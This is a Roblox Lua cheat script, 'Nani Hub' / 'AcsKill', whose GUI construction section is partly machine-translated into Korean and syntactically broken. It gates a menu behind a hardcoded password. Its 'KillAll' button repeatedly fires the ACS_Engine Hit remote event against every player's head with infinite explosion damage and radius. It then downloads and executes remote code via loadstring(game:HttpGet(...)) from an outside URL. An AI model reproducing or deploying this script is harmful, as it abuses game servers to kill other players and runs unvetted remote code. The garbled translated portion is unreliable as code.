로컬 KnsGui = Instance.new("ScreenGui")


로컬 로그인프레임 = 인스턴스.new("프레임")


로컬 UICorner = Instance.new("UICorner")


로컬 텍스트 상자 = 인스턴스.new("텍스트 상자")


로컬 UICorner_2 = Instance.new("UICorner")


로컬 텍스트 버튼 = 인스턴스.new("텍스트 버튼")


로컬 UICorner_3 = Instance.new("UICorner")


로컬 TextLabel = Instance.new("TextLabel")


로컬 UICorner_4 = Instance.new("UICorner")


로컬 프레임 = Instance.new("프레임")


로컬 Frame_2 = Instance.new("프레임")


로컬 UICorner_5 = Instance.new("UICorner")


로컬 Frame_3 = Instance.new("프레임")


로컬 TextLabel_2 = Instance.new("TextLabel")


로컬 UICorner_6 = Instance.new("UICorner")


로컬 TextButton_2 = Instance.new("TextButton")


로컬 UICorner_7 = Instance.new("UICorner")


로컬 모드버튼 = 인스턴스.새로운("텍스트 버튼")


로컬 UICorner_8 = Instance.new("UICorner")



KnsGui.Name = "KnsGui"


KnsGui.부모 = 게임. 코구이


KnsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling


KnsGui.DisplayOrder = 1000000000



LoginFrame.Name = "로그인프레임"


로그인프레임.부모 = KnsGui


로그인프레임.배경색3 = 컬러3.fromRGB(35, 35, 35)


LoginFrame.Position = UDim2.new(0.408533216, 0, 0.407215863, 0)


로그인프레임.크기 = UDim2.new(0, 350, 0, 200)


로그인프레임.액티브 = true


LoginFrame.Draggable = true



UICorner.부모 = 로그인프레임



TextBox.Parent = LoginFrame


TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)


TextBox.Position = UDim2.new(0.180000007, 0, 0.325000018, 0)


텍스트 상자.크기 = UDim2.new(0, 223, 0, 31)


TextBox.Font = Enum.Font.GothamBold


TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)


TextBox.PlaceholderText = "Password"


텍스트 상자.텍스트 = ""


TextBox.TextColor3 = Color3.fromRGB(178, 178, 178)


텍스트 상자.텍스트 크기 = 14.000



UICorner_2.부모 = 텍스트 상자



TextButton.Parent = LoginFrame


TextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 93)


TextButton.Position = UDim2.new(0.214285716, 0, 0.654999971, 0)


텍스트 버튼.크기 = UDim2.new(0, 200, 0, 36)


TextButton.Font = Enum.Font.GothamBold


TextButton.Text = "Start"


TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)


텍스트버튼.텍스트크기 = 18.000



UICorner_3.코너 반경 = UDim.new(0, 5)


UICorner_3.부모 = 텍스트 버튼



TextLabel.Parent = LoginFrame


TextLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)


텍스트 레이블.크기 = UDim2.new(0, 350, 0, 37)


TextLabel.Font = Enum.Font.GothamBold


TextLabel.Text = "Nani Hub"


TextLabel.TextColor3 = Color3.fromRGB(175, 175, 175)


TextLabel.TextSize = 18.000



UICorner_4.부모 = 텍스트 레이블



프레임.부모 = 로그인프레임


프레임.표시 = 거짓


프레임.배경색3 = 컬러3.fromRGB(30, 30, 30)


프레임.테두리 크기픽셀 = 0


프레임.위치 = UDim2.new(0, 0, 0.144999996, 0)


프레임.크기 = UDim2.new(0, 350, 0, 8)


프레임.활성 = 참


프레임.드래깅 가능 = 참



Frame_2.부모 = KnsGui


Frame_2.배경색3 = 색3.fromRGB(35, 35, 35)


Frame_2.위치 = UDim2.new(0, 0, -0.00140485435, 0)


Frame_2.크기 = UDim2.new(0, 120, 0, 107)



UICorner_5.부모 = Frame_2



Frame_3.부모 = Frame_2


Frame_3.배경색3 = 색3.fromRGB(30, 30, 30)


Frame_3.BorderSizePixel = 0


Frame_3.위치 = UDim2.new(0, 0, 0.144999981, 0)


Frame_3.크기 = UDim2.new(0, 119, 0, 8)



TextLabel_2.Parent = Frame_2


TextLabel_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)


TextLabel_2.Position = UDim2.new(0.00833333377, 0, 0, 0)


TextLabel_2.Size = UDim2.new(0, 119, 0, 22)


TextLabel_2.Font = Enum.Font.GothamBold


TextLabel_2.Text = "Main"


TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)


TextLabel_2.TextSize = 15.000



UICorner_6.Parent = TextLabel_2



TextButton_2.Parent = Frame_2


TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 255, 93)


TextButton_2.Position = UDim2.new(0.125, 0, 0.339805841, 0)


TextButton_2.Size = UDim2.new(0, 88, 0, 19)


TextButton_2.Font = Enum.Font.GothamBold


TextButton_2.Text = "KillAll"


TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)


TextButton_2.TextSize = 14.000



UICorner_7.CornerRadius = UDim.new(0, 4)


UICorner_7.Parent = TextButton_2



ModeButton.Name = "ModeButton"


ModeButton.Parent = Frame_2


ModeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 93)


ModeButton.Position = UDim2.new(0.125, 0, 0.631067991, 0)


ModeButton.Size = UDim2.new(0, 88, 0, 19)


ModeButton.Font = Enum.Font.GothamBold


ModeButton.Text = "Mode"


ModeButton.TextColor3 = Color3.fromRGB(0, 0, 0)


ModeButton.TextSize = 14.000



UICorner_8.CornerRadius = UDim.new(0, 4)


UICorner_8.Parent = ModeButton



-- Scripts:



local function UYSGS_fake_script() -- KnsGui.LocalScript 


	local script = Instance.new('LocalScript', KnsGui)



	game.StarterGui:SetCore("SendNotification",  {


	    Title = "AcsKill";


	    Text = "Login Pls";


	    Icon = "";


	    Duration = 5;


	    Button1 = "ok";


	})


	


	local player = game.Players.LocalPlayer


	local Frame = script.Parent.LoginFrame


	local MainFrame = script.Parent.Frame


	local KillButton = MainFrame.TextButton


	local ModeButton = MainFrame.ModeButton


	local TextBox = Frame.TextBox


	local Button = Frame.TextButton


	local Mode = true


	


	local character1 = player.Character


	local mouse = player:GetMouse()


	


	function GetPlayer(name)


	    for i,v in pairs(game:GetService("Players"):GetPlayers()) do


	        if v.DisplayName:lower():sub(1, #name) == name:lower() or v.Name:lower():sub(1, #name) == name:lower() then


	            return v


	        end


	    end    


	end


	


	local plrs = game:GetService("Players")


	local plr = plrs.LocalPlayer


	local char = plr.Character


	local place = game.PlaceId


	local Logo = "rbxassetid://2093843497"


	local prefix = "/"


	local Health = 100


	


	plr.Chatted:Connect(function(msg)


	    if string.sub(msg, 1, 6) == prefix .. "mode" then


	        if Mode == true then


	            Mode = false


	            game.StarterGui:SetCore("SendNotification",  {


	                Title = "AcsKill";


	                Text = "Mode False!";


	                Icon = "";


	                Duration = 5;


	                Button1 = "ok";


	            })


	        elseif Mode == false then


	            Mode = true


	            game.StarterGui:SetCore("SendNotification",  {


	                Title = "AcsKill";


	                Text = "Mode True!";


	                Icon = "";


	                Duration = 5;


	                Button1 = "ok";


	            })


	        end


	    elseif string.sub(msg, 1, 7) == prefix .. "close" then


	        MainFrame.Visible = false


	        game.StarterGui:SetCore("SendNotification",  {


	            Title = "AcsKill";


	            Text = "Close!";


	            Icon = "";


	            Duration = 5;


	            Button1 = "ok";


	        })


	    elseif string.sub(msg, 1, 6) == prefix .. "open" then


	        MainFrame.Visible = true


	        game.StarterGui:SetCore("SendNotification",  {


	            Title = "AcsKill";


	            Text = "Open!";


	            Icon = "";


	            Duration = 5;


	            Button1 = "ok";


	        })


	    end


	end)


	


	


	Button.MouseButton1Down:Connect(function()


	    if TextBox.Text == "nanibot-team" then


	        game.StarterGui:SetCore("SendNotification",  {


	            Title = "AcsKill";


	            Text = "Sussecc!";


	            Icon = "";


	            Duration = 5;


	            Button1 = "ok";


	        })


	        Frame.Visible = false


	        MainFrame.Visible = true


	    else


	        player:Kick("your Fall Login")


	    end


	end)


	


	KillButton.MouseButton1Down:Connect(function()


	    if Mode == true then


	        local plr = game.Players.LocalPlayer


	        local Evt = game.ReplicatedStorage.ACS_Engine.Eventos


	


	        local Settings = {


	            ["ExplosiveHit"] = true,


	            ["ExPressure"] = math.huge,


	            ["ExpRadius"] = math.huge,


	            ["DestroyJointRadiusPercent"] = math.huge,


	            ["ExplosionDamage"] = math.huge,


	        }


	        while wait(10) do 


	            pcall(function()


	                for i,v in pairs(game.Players:GetChildren()) do


	                    game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(v.Character.Head.Position, v.Character.Head, v.Character.Head.Position, Enum.Material.Plastic, Settings)


	                end 


	            end)


	        end


	        loadstring(game:HttpGet("https://mynickname.com/blastingstone"))()


	    end


	end)


	


	ModeButton.MouseButton1Down:Connect(function()


	    if Mode == true then


	        Mode = false


	        game.StarterGui:SetCore("SendNotification",  {


	            Title = "AcsKill";


	            Text = "Mode False!";


	            Icon = "";


	            Duration = 5;


	            Button1 = "ok";


	        })


	    elseif Mode == false then


	        Mode = true


	        game.StarterGui:SetCore("SendNotification",  {


	            Title = "AcsKill";


	            Text = "Mode True!";


	            Icon = "";


	            Duration = 5;


	            Button1 = "ok";


	        })


	    end


	end)


end


coroutine.wrap(UYSGS_fake_script)()


